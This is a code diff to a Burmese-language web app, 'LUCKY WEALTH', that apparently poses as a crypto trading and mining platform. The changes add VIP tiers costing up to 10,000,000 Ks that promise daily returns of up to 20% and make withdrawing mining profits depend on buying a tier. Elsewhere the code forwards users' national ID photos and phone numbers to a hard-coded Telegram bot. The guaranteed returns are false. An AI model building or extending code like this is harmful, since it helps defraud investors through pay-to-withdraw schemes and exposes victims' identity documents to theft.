@@ -92,7 +92,13 @@
         .active-mining-info { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 15px; margin-top: 10px; font-size: 12px; border: 1px solid var(--border); border-left: 4px solid var(--primary); }
         .market-item { display: flex; justify-content: space-between; align-items: center; padding: 15px; background: rgba(255,255,255,0.05); margin-bottom: 10px; border-radius: 15px; border: 1px solid var(--border); cursor: pointer; }
 
-        .vip-card { border: 1px solid var(--active-gold); background: linear-gradient(145deg, rgba(255, 215, 0, 0.05), rgba(0,0,0,0.3)); position: relative; overflow: hidden; }
+        .vip-card { border: 1px solid var(--active-gold); background: linear-gradient(145deg, rgba(255, 215, 0, 0.05), rgba(0,0,0,0.3)); position: relative; overflow: hidden; margin-bottom: 20px; }
+        .vip-card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; padding-bottom: 12px; border-bottom: 1px dashed rgba(255,215,0,0.3); }
+        .vip-card-price { color: var(--active-gold); font-size: 20px; font-weight: bold; }
+        .vip-benefits { background: rgba(0,0,0,0.3); border-radius: 10px; padding: 12px; margin: 10px 0; }
+        .vip-benefit-item { display: flex; align-items: flex-start; gap: 8px; font-size: 12px; color: #fff; margin-bottom: 6px; line-height: 1.5; }
+        .vip-benefit-item i { color: var(--green); font-size: 12px; margin-top: 3px; }
+        .vip-benefit-item.exclusive i { color: var(--active-gold); }
         
         .support-float { position: fixed; left: 90px; bottom: 100px; width: 55px; height: 55px; background: #0088cc; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 24px; box-shadow: 0 4px 15px rgba(0,136,204,0.4); z-index: 1001; text-decoration: none; animation: bounce 2s infinite; }
         @keyframes bounce { 0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 40% {transform: translateY(-10px);} 60% {transform: translateY(-5px);} }
@@ -212,7 +218,7 @@
         <h2 style="font-weight:800;">LUCKY WEALTH</h2>
         <div style="display:flex; gap:18px; align-items: center;">
             <i class="fas fa-info-circle" style="font-size:22px; color:var(--primary); cursor:pointer;" onclick="showPage('info-page')"></i>
-            <i class="fas fa-bell" style="font-size:22px; color:var(--active-gold); cursor:pointer;" onclick="showPage('vip-page')"></i>
+            <i class="fas fa-bell" style="font-size:22px; color:var(--active-gold); cursor:pointer; animation: pulse 2s infinite;" onclick="showPage('vip-page')"></i>
             <i class="fas fa-shield-alt" style="font-size:22px; color:var(--primary);" onclick="showPage('setting-page')"></i>
             <i class="fas fa-user-shield" style="font-size:22px;" id="admin-trigger"></i>
         </div>
@@ -292,9 +298,6 @@
     <div id="announcement-list"></div>
 </div>
 
-<!-- ============================================================ -->
-<!-- INFO PAGE - MEXC သမိုင်းကြောင်း အပြည့်အစုံ -->
-<!-- ============================================================ -->
 <div id="info-page" class="page">
     <div style="display:flex; align-items:center; gap:15px; margin-bottom:20px;">
         <i class="fas fa-arrow-left" onclick="showPage('dash-page')"></i>
@@ -437,17 +440,37 @@
     </div>
 </div>
 
+<!-- ============================================================ -->
+<!-- VIP PAGE - VIP တင်နိုင်သောနေရာ (အပြည့်အစုံ) -->
+<!-- ============================================================ -->
 <div id="vip-page" class="page">
     <div style="display:flex; align-items:center; gap:15px; margin-bottom:20px;">
         <i class="fas fa-arrow-left" onclick="showPage('dash-page')"></i>
         <h3>VIP Membership Levels</h3>
     </div>
-    <div class="card" style="border: 1px solid var(--active-gold); text-align: center; background-image: url('https://i.ibb.co/Qvf6fXdp/images.jpg'); background-size: cover; background-position: center; min-height: 120px;">
-        <div style="background: rgba(0,0,0,0.6); padding: 20px; border-radius: 15px; height: 100%;">
-            <p style="margin: 0; font-size: 14px; color: #fff;">Your Current Status</p>
-            <h2 id="current-vip-level" style="color: var(--active-gold); margin: 5px 0;">VIP 0 MEMBER</h2>
+    
+    <!-- Current Status Banner -->
+    <div class="card" style="border: 2px solid var(--active-gold); text-align: center; background: linear-gradient(135deg, rgba(255,215,0,0.15), rgba(0,0,0,0.5)); margin-bottom: 20px;">
+        <div style="padding: 10px;">
+            <p style="margin: 0; font-size: 13px; color: #fff;">👑 သင်၏ လက်ရှိ VIP အဆင့်</p>
+            <h2 id="current-vip-level" style="color: var(--active-gold); margin: 8px 0; font-size: 24px;">VIP 0 MEMBER</h2>
+            <p style="margin: 0; font-size: 11px; color: var(--dim);" id="vip-status-text">VIP အဆင့်မြှင့်တင်ရန် အောက်တွင် ရွေးချယ်ပါ</p>
         </div>
     </div>
+
+    <!-- VIP Info Box -->
+    <div class="info-box" style="border-left: 4px solid var(--active-gold); margin-bottom: 20px;">
+        <p style="margin: 0; font-size: 12px; color: var(--active-gold); font-weight: bold;">
+            ⭐ VIP အဆင့်မြှင့်တင်ခြင်း၏ အကျိုးကျေးဇူးများ
+        </p>
+        <p style="margin: 8px 0 0 0; font-size: 12px; color: var(--dim); line-height: 1.6;">
+            • Trading အမြတ် % ပိုမိုရရှိမည်<br>
+            • Mining အမြတ်ငွေ ထုတ်ယူနိုင်မည်<br>
+            • Mining ရပ်တန့်ခွင့် ရရှိမည်<br>
+            • အထူးအခွင့်အရေးများ ရရှိမည်
+        </p>
+    </div>
+    
     <div id="vip-tiers-list"></div>
 </div>
 
@@ -673,7 +696,7 @@
     const TELEGRAM_CHAT_ID = "7709938396";
 
     // ================================================================
-    // 📨 TELEGRAM QUEUE SYSTEM — 429 Error ဖြေရှင်းရန်
+    // 📨 TELEGRAM QUEUE SYSTEM
     // ================================================================
     let telegramQueue = [];
     let telegramProcessing = false;
@@ -688,10 +711,7 @@
     }
 
     async function sendTelegramPhoto(file, caption) {
-        if(!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-            console.log("Telegram not configured");
-            return;
-        }
+        if(!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
         telegramQueue.push({ type: 'photo', file: file, caption: caption });
         processTelegramQueue();
     }
@@ -729,16 +749,12 @@
                 console.log("Telegram error:", e);
             }
             
-            // 1.5 second delay — Rate Limit မကျော်ရန်
             await new Promise(resolve => setTimeout(resolve, 1500));
         }
         
         telegramProcessing = false;
     }
 
-    // ================================================================
-    // 📋 Notification Helper
-    // ================================================================
     function notifyBot(action, data) {
         const timestamp = new Date().toLocaleString('en-GB', { timeZone: 'Asia/Yangon' });
         let msg = `🔔 <b>${action}</b>\n`;
@@ -755,9 +771,6 @@
         sendTelegram(msg);
     }
 
-    // ================================================================
-    // 📷 NRC IMAGE UPLOAD HANDLER
-    // ================================================================
     function handleImageUpload(type) {
         const input = document.getElementById(`${type}-input`);
         const preview = document.getElementById(`${type}-preview`);
@@ -870,9 +883,6 @@
         }
     }
 
-    // ================================================================
-    // 🔐 HANDLE AUTH
-    // ================================================================
     async function handleAuth(type) {
         const ph = document.getElementById(type==='login'?'log-ph':'reg-ph').value.trim();
         const pw = document.getElementById(type==='login'?'log-pw':'reg-pw').value;
@@ -945,6 +955,23 @@
             document.getElementById('current-vip-level').innerText = "VIP " + (val.vip || 0) + " MEMBER";
             
             currentVipLevel = val.vip || 0;
+            
+            // VIP Status Text ပြောင်း
+            const statusText = document.getElementById('vip-status-text');
+            if(statusText) {
+                if(currentVipLevel === 0) {
+                    statusText.innerText = "VIP အဆင့်မြှင့်တင်ရန် အောက်တွင် ရွေးချယ်ပါ";
+                } else if(currentVipLevel === 1) {
+                    statusText.innerText = "🥇 VIP 1 — Mining အမြတ်ငွေ ထုတ်ယူခွင့် ရရှိပါပြီ";
+                } else if(currentVipLevel === 2) {
+                    statusText.innerText = "🥈 VIP 2 — Mining ရပ်တန့်ခွင့် ရရှိပါပြီ";
+                } else if(currentVipLevel === 3) {
+                    statusText.innerText = "🥉 VIP 3 — အထူးအခွင့်အရေး ရရှိပါပြီ";
+                } else if(currentVipLevel >= 4) {
+                    statusText.innerText = "👑 VIP " + currentVipLevel + " — အမြင့်ဆုံးအဆင့်";
+                }
+            }
+            
             updateVerifyBanner(val.verificationStatus);
         });
         
@@ -1002,9 +1029,6 @@
         }
     }
 
-    // ================================================================
-    // 🆔 VERIFICATION SUBMIT
-    // ================================================================
     async function submitVerification() {
         if(!user) return alert("ကျေးဇူးပြု၍ အရင်ဆုံး Login ဝင်ပါ။");
         
@@ -1037,8 +1061,7 @@
             'Name': uData.username,
             'Phone': user,
             'NRC': nrc,
-            'Status': '⏳ PENDING',
-            'Note': 'NRC ပုံ ၃ ပုံ အောက်တွင် ပါဝင်ပါသည်'
+            'Status': '⏳ PENDING'
         });
         
         await sendTelegramPhoto(nrcImages.front, `📷 NRC Front - ${uData.username} (${user})`);
@@ -1065,7 +1088,7 @@
                         <i class="fas fa-clock" style="font-size:24px;"></i>
                         <div>
                             <b>⏳ Verification စစ်ဆေးဆဲ</b>
-                            <div style="font-size:12px; opacity:0.8; margin-top:5px;">သင့် NRC ပုံများကို Admin မှ စစ်ဆေးနေပါသည်။ ခေတ္တစောင့်ဆိုင်းပေးပါ။</div>
+                            <div style="font-size:12px; opacity:0.8; margin-top:5px;">သင့် NRC ပုံများကို Admin မှ စစ်ဆေးနေပါသည်။</div>
                         </div>
                     </div>`;
                 formCard.style.display = 'none';
@@ -1103,21 +1126,163 @@
         });
     }
 
+    // ================================================================
+    // 👑 VIP DATA — VIP Levels + Benefits အပြည့်အစုံ
+    // ================================================================
+    const vipData = [
+        { 
+            level: 1, 
+            cost: 100000, 
+            daily: "2.5%", 
+            gift: "Bonus 5,000 Ks", 
+            limit: "500,000 Ks",
+            icon: "🥇",
+            color: "#2EBD85",
+            desc: "VIP 1 ဖြစ်ပါက Trading အမြတ်ပိုရမည့်အပြင် Mining အမြတ်ငွေများကို ထုတ်ယူနိုင်မည်။",
+            benefits: [
+                { text: "Trading အမြတ် +2% ပိုရမည်", exclusive: false },
+                { text: "Mining အမြတ်ငွေ ထုတ်ယူခွင့် ရရှိမည် ⭐", exclusive: true },
+                { text: "Bonus 5,000 Ks ချက်ချင်းရရှိမည်", exclusive: false },
+                { text: "Daily အမြတ် 2.5% အထိ ရရှိမည်", exclusive: false },
+                { text: "Withdraw Limit: 500,000 Ks", exclusive: false }
+            ]
+        },
+        { 
+            level: 2, 
+            cost: 300000, 
+            daily: "5.0%", 
+            gift: "Bonus 15,000 Ks", 
+            limit: "1,500,000 Ks",
+            icon: "🥈",
+            color: "#00DBB1",
+            desc: "VIP 2 အတွက် Mining ရပ်တန့်ခွင့် ရရှိမည်။ သို့သော် အရင်းသာရမည်။",
+            benefits: [
+                { text: "Trading အမြတ် +4% ပိုရမည်", exclusive: false },
+                { text: "Mining အမြတ်ငွေ ထုတ်ယူခွင့် ရရှိမည်", exclusive: false },
+                { text: "Mining ရပ်တန့်ခွင့် ရရှိမည် (အရင်းသာရ) 🛑", exclusive: true },
+                { text: "Bonus 15,000 Ks ချက်ချင်းရရှိမည်", exclusive: false },
+                { text: "Daily အမြတ် 5.0% အထိ ရရှိမည်", exclusive: false },
+                { text: "Withdraw Limit: 1,500,000 Ks", exclusive: false }
+            ]
+        },
+        { 
+            level: 3, 
+            cost: 1000000, 
+            daily: "8.5%", 
+            gift: "Bonus 60,000 Ks", 
+            limit: "5,000,000 Ks",
+            icon: "🥉",
+            color: "#FFD700",
+            desc: "VIP 3 သည် အထူးအခွင့်အရေးများ ရရှိမည်။ Mining ရပ်တန့်လျှင် အရင်း+အမြတ် ချက်ချင်းရမည်။",
+            benefits: [
+                { text: "Trading အမြတ် +6% ပိုရမည်", exclusive: false },
+                { text: "Mining အမြတ်ငွေ ထုတ်ယူခွင့် ရရှိမည်", exclusive: false },
+                { text: "Mining ရပ်တန့်ခွင့် — ရက်စောင့်စရာမလိုပဲ ⚡", exclusive: true },
+                { text: "အရင်း + အမြတ် ချက်ချင်းရရှိမည် ⭐", exclusive: true },
+                { text: "၅ ရက်စာ အမြတ်ငွေပါ ရရှိမည်", exclusive: true },
+                { text: "Bonus 60,000 Ks ချက်ချင်းရရှိမည်", exclusive: false },
+                { text: "Daily အမြတ် 8.5% အထိ ရရှိမည်", exclusive: false },
+                { text: "Withdraw Limit: 5,000,000 Ks", exclusive: false }
+            ]
+        },
+        { 
+            level: 4, 
+            cost: 5000000, 
+            daily: "12.0%", 
+            gift: "Bonus 300,000 Ks", 
+            limit: "Unlimited",
+            icon: "💎",
+            color: "#00A3FF",
+            desc: "VIP 4 အတွက် 24/7 Personal Assistant ဝန်ဆောင်မှု ရရှိမည်။",
+            benefits: [
+                { text: "Trading အမြတ် +8% ပိုရမည်", exclusive: false },
+                { text: "Mining အမြတ်ငွေ ထုတ်ယူခွင့် ရရှိမည်", exclusive: false },
+                { text: "Mining ရပ်တန့်ခွင့် — အရင်း+အမြတ်", exclusive: true },
+                { text: "24/7 Personal Assistant 👤", exclusive: true },
+                { text: "Bonus 300,000 Ks ချက်ချင်းရရှိမည်", exclusive: false },
+                { text: "Daily အမြတ် 12.0% အထိ ရရှိမည်", exclusive: false },
+                { text: "Withdraw Limit: Unlimited", exclusive: false }
+            ]
+        },
+        { 
+            level: 5, 
+            cost: 10000000, 
+            daily: "20.0%", 
+            gift: "Bonus 1,000,000 Ks", 
+            limit: "Unlimited",
+            icon: "👑",
+            color: "#FF6B6B",
+            desc: "VIP 5 အမြင့်ဆုံးအဆင့်ဖြစ်ပြီး Platform ၏ အထူးအခွင့်အရေးအားလုံး ရရှိမည်။",
+            benefits: [
+                { text: "Trading အမြတ် +10% ပိုရမည်", exclusive: false },
+                { text: "Mining အမြတ်ငွေ ထုတ်ယူခွင့် ရရှိမည်", exclusive: false },
+                { text: "Mining ရပ်တန့်ခွင့် — အရင်း+အမြတ်", exclusive: true },
+                { text: "24/7 VIP Personal Assistant 👤", exclusive: true },
+                { text: "အထူးအခွင့်အရေးအားလုံး ⭐", exclusive: true },
+                { text: "Bonus 1,000,000 Ks ချက်ချင်းရရှိမည်", exclusive: false },
+                { text: "Daily အမြတ် 20.0% အထိ ရရှိမည်", exclusive: false },
+                { text: "Withdraw Limit: Unlimited", exclusive: false }
+            ]
+        }
+    ];
+
+    // ================================================================
+    // 🎨 RENDER VIP TIERS — VIP Card များကို အလှဆင်ပြသ
+    // ================================================================
     function renderVIP() {
         let h = "";
         vipData.forEach(v => {
-            h += `<div class="card vip-card">
-                <div style="display:flex; justify-content:space-between; align-items:center;">
-                    <h3 style="color:var(--active-gold); margin:0;">VIP ${v.level}</h3>
-                    <b style="font-size:18px;">${v.cost.toLocaleString()} Ks</b>
+            const isCurrent = currentVipLevel === v.level;
+            const isLocked = currentVipLevel >= v.level;
+            
+            h += `<div class="vip-card" style="${isCurrent ? 'border: 2px solid var(--active-gold); box-shadow: 0 0 25px rgba(255,215,0,0.4);' : ''}">
+                <div class="vip-card-header">
+                    <div>
+                        <h3 style="color:${v.color}; margin:0; font-size: 18px;">${v.icon} VIP ${v.level}</h3>
+                        <small style="color: var(--dim); font-size: 11px;">${isCurrent ? '✅ လက်ရှိအဆင့်' : (isLocked ? '✅ ပိုင်ဆိုင်ပြီး' : '🔒 မတင်ရသေး')}</small>
+                    </div>
+                    <div class="vip-card-price">${v.cost.toLocaleString()} Ks</div>
                 </div>
-                <p style="font-size:12px; color:var(--dim); margin:10px 0;">${v.desc}</p>
-                <div style="display:flex; justify-content:space-between; font-size:11px; margin-bottom:15px; color:var(--primary);">
-                    <span>Daily: ${v.daily}</span>
-                    <span>Reward: ${v.gift}</span>
-                    <span>Limit: ${v.limit}</span>
+                
+                <p style="font-size:12px; color:var(--dim); margin: 8px 0; line-height: 1.6;">${v.desc}</p>
+                
+                <!-- Benefits List -->
+                <div class="vip-benefits">
+                    <p style="margin: 0 0 8px 0; font-size: 11px; color: var(--active-gold); font-weight: bold;">
+                        🎁 ရရှိမည့် အခွင့်အရေးများ:
+                    </p>
+                    ${v.benefits.map(b => `
+                        <div class="vip-benefit-item ${b.exclusive ? 'exclusive' : ''}">
+                            <i class="fas ${b.exclusive ? 'fa-star' : 'fa-check-circle'}"></i>
+                            <span>${b.text}</span>
+                        </div>
+                    `).join('')}
                 </div>
-                <button class="btn btn-main" style="padding:10px;" onclick="applyClickGold(this); buyVIP(${v.level}, ${v.cost})">Upgrade to VIP ${v.level}</button>
+                
+                <!-- Stats Row -->
+                <div style="display:flex; justify-content:space-between; font-size:11px; margin: 12px 0; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 8px;">
+                    <div style="text-align:center;">
+                        <div style="color: var(--primary); font-weight: bold; font-size: 14px;">${v.daily}</div>
+                        <div style="color: var(--dim); font-size: 10px;">Daily %</div>
+                    </div>
+                    <div style="text-align:center;">
+                        <div style="color: var(--active-gold); font-weight: bold; font-size: 14px;">${v.gift.replace('Bonus ', '')}</div>
+                        <div style="color: var(--dim); font-size: 10px;">Bonus</div>
+                    </div>
+                    <div style="text-align:center;">
+                        <div style="color: var(--green); font-weight: bold; font-size: 14px;">${v.limit.replace(' Ks', '')}</div>
+                        <div style="color: var(--dim); font-size: 10px;">Limit</div>
+                    </div>
+                </div>
+                
+                <!-- Action Button -->
+                ${isCurrent 
+                    ? `<button class="btn btn-green" style="padding:12px; cursor:default;" disabled>✅ လက်ရှိအဆင့် — VIP ${v.level}</button>`
+                    : (isLocked 
+                        ? `<button class="btn" style="padding:12px; background:#333; color:#888; cursor:not-allowed;" disabled>🔒 ပိုင်ဆိုင်ပြီးသား</button>`
+                        : `<button class="btn btn-main" style="padding:12px;" onclick="applyClickGold(this); buyVIP(${v.level}, ${v.cost})">⭐ VIP ${v.level} သို့ အဆင့်မြှင့်မည်</button>`
+                    )
+                }
             </div>`;
         });
         document.getElementById('vip-tiers-list').innerHTML = h;
@@ -1125,20 +1290,23 @@
 
     function buyVIP(lvl, cost) {
         db.ref('users/'+user).once('value', s => {
-            if(s.val().balance < cost) return alert("VIP အဆင့်မြှင့်တင်ရန် လက်ကျန်ငွေ မလုံလောက်ပါ။");
+            if(s.val().balance < cost) return alert("VIP အဆင့်မြှင့်တင်ရန် လက်ကျန်ငွေ မလုံလောက်ပါ။\n\nလိုအပ်ငွေ: " + cost.toLocaleString() + " Ks\nလက်ရှိငွေ: " + (s.val().balance || 0).toLocaleString() + " Ks");
             if(s.val().vip >= lvl) return alert("သင်သည် ဤအဆင့် (သို့မဟုတ်) ဤထက်မြင့်သော အဆင့်သို့ ရောက်ရှိပြီးသား ဖြစ်ပါသည်။");
-            if(confirm(`VIP ${lvl} သို့ ${cost.toLocaleString()} Ks ဖြင့် အဆင့်မြှင့်မှာ သေချာပါသလား?`)) {
-                db.ref('users/'+user).update({ balance: s.val().balance - cost, vip: lvl }).then(() => {
-                    notifyBot('⭐ VIP UPGRADE', {
-                        'User': user,
-                        'Name': s.val().username,
-                        'VIP Level': 'VIP ' + lvl,
-                        'Cost': cost.toLocaleString() + ' Ks',
-                        'New Balance': (s.val().balance - cost).toLocaleString() + ' Ks'
-                    });
-                    alert("VIP အဆင့်မြှင့်တင်မှု အောင်မြင်ပါသည်။");
+            
+            const vipInfo = vipData.find(v => v.level === lvl);
+            if(!confirm(`⭐ VIP ${lvl} သို့ အဆင့်မြှင့်တင်မည်\n\n💰 ကုန်ကျငွေ: ${cost.toLocaleString()} Ks\n🎁 ရရှိမည့် Bonus: ${vipInfo.gift}\n📈 Daily အမြတ်: ${vipInfo.daily}\n\nသေချာပါသလား?`)) return;
+            
+            db.ref('users/'+user).update({ balance: s.val().balance - cost, vip: lvl }).then(() => {
+                notifyBot('⭐ VIP UPGRADE', {
+                    'User': user,
+                    'Name': s.val().username,
+                    'VIP Level': 'VIP ' + lvl,
+                    'Cost': cost.toLocaleString() + ' Ks',
+                    'Bonus': vipInfo.gift,
+                    'New Balance': (s.val().balance - cost).toLocaleString() + ' Ks'
                 });
-            }
+                alert("🎉 ဂုဏ်ယူပါသည်!\n\nVIP " + lvl + " သို့ အောင်မြင်စွာ အဆင့်မြှင့်တင်ပြီးပါပြီ။\n\n🎁 " + vipInfo.gift + " ရရှိပါပြီ။");
+            });
         });
     }
 
@@ -1190,7 +1358,7 @@
                 'Pair': document.getElementById('pair-name').innerText,
                 'Side': side === 'BUY' ? '📈 CALL UP' : '📉 PUT DOWN',
                 'Amount': amt.toLocaleString() + ' Ks',
-                'Balance Before': uData.balance.toLocaleString() + ' Ks'
+                'VIP Bonus': '+' + (uData.vip * 2) + '%'
             });
             
             let tVal = cDur; const timer = setInterval(() => { 
@@ -1265,18 +1433,14 @@
                     } else { timeText = "Mining ပြီးဆုံးပါပြီ!"; progress = 100; }
                 }
 
-                // VIP Level အလိုက် ခလုတ်ပြသမှု
                 let actionButton = '';
                 if(data.status === 'running') {
                     if(currentVipLevel >= 3) {
-                        // VIP 3 — ရက်စောင့်စရာမလိုပဲ ရပ်နိုင်သည်
                         actionButton = `<button class="btn btn-green" onclick="applyClickGold(this); stopMiningVIP3('${r.key}', ${data.totalProfit}, ${data.amt})" style="padding:10px; font-size:11px; margin-top:10px;">⚡ ရပ်တန့်မည် (အရင်း+အမြတ် ချက်ချင်းရ)</button>`;
                     } else if(currentVipLevel >= 2) {
-                        // VIP 2 — ရပ်နိုင်သည်၊ ဒါပေမယ့် အရင်းသာရ
                         actionButton = `<button class="btn btn-red" onclick="applyClickGold(this); stopMiningVIP2('${r.key}', ${data.amt})" style="padding:10px; font-size:11px; margin-top:10px;">🛑 ရပ်တန့်မည် (အရင်းသာရ)</button>`;
                     }
                     
-                    // ပြီးဆုံးရင် ထုတ်ယူခွင့်
                     if(now >= data.expiryTime) {
                         actionButton += `<button class="btn btn-main" onclick="applyClickGold(this); claimMining('${r.key}', ${data.totalProfit})" style="padding:10px; font-size:11px; margin-top:10px;">အမြတ်ငွေ အားလုံးထုတ်ယူမည်</button>`;
                     }
@@ -1343,19 +1507,15 @@
         });
     }
 
-    // ================================================================
-    // 🛑 VIP 2 — Mining ရပ်တန့် (အရင်းသာရ)
-    // ================================================================
     function stopMiningVIP2(key, amount) {
         if(currentVipLevel < 2) return alert("VIP Level 2 တင်ရှိမှသာ ရပ်တန့်နိုင်ပါသည်။");
         
-        if(!confirm("⚠️ သတိပေးချက်\n\nVIP Level 2 အနေနဲ့ Mining ကို ရပ်တန့်လိုက်ပါက —\n\n✅ အရင်း: " + amount.toLocaleString() + " Ks ပြန်ရမည်\n❌ အမြတ်: ရရှိမည် မဟုတ်ပါ\n\nသေချာပါသလား?")) return;
+        if(!confirm("⚠️ သတိပေးချက်\n\nVIP Level 2 အနေနဲ့ Mining ကို ရပ်တန့်လိုက်ပါက —\n\n✅ အရင်း: " + parseFloat(amount).toLocaleString() + " Ks ပြန်ရမည်\n❌ အမြတ်: ရရှိမည် မဟုတ်ပါ\n\nသေချာပါသလား?")) return;
         
         db.ref(`requests/mining/${key}`).once('value', s => {
             const data = s.val();
             if(!data) return;
             
-            // အရင်းသာ ပြန်ပေး
             db.ref('users/'+user+'/balance').transaction(b => (b||0) + parseFloat(amount));
             db.ref(`requests/mining/${key}`).update({ 
                 status: 'stopped', 
@@ -1375,9 +1535,6 @@
         });
     }
 
-    // ================================================================
-    // ⚡ VIP 3 — Mining ရပ်တန့် (အရင်း+အမြတ် ချက်ချင်းရ)
-    // ================================================================
     function stopMiningVIP3(key, totalProfit, amount) {
         if(currentVipLevel < 3) return alert("VIP Level 3 တင်ရှိမှသာ ဤအင်္ဂါရပ်ကို အသုံးပြုနိုင်ပါသည်။");
         
@@ -1389,7 +1546,6 @@
             
             const total = parseFloat(amount) + parseFloat(totalProfit);
             
-            // အရင်း + အမြတ် အားလုံး ပြန်ပေး
             db.ref('users/'+user+'/balance').transaction(b => (b||0) + total);
             db.ref(`requests/mining/${key}`).update({ 
                 status: 'completed', 
@@ -1539,9 +1695,6 @@
         } 
     }
 
-    // ================================================================
-    // 🔐 ADMIN TRIGGER
-    // ================================================================
     document.getElementById('admin-trigger').onclick = () => {
         if(!user) return alert("ကျေးဇူးပြု၍ အရင်ဆုံး Login ဝင်ပါ။");
         
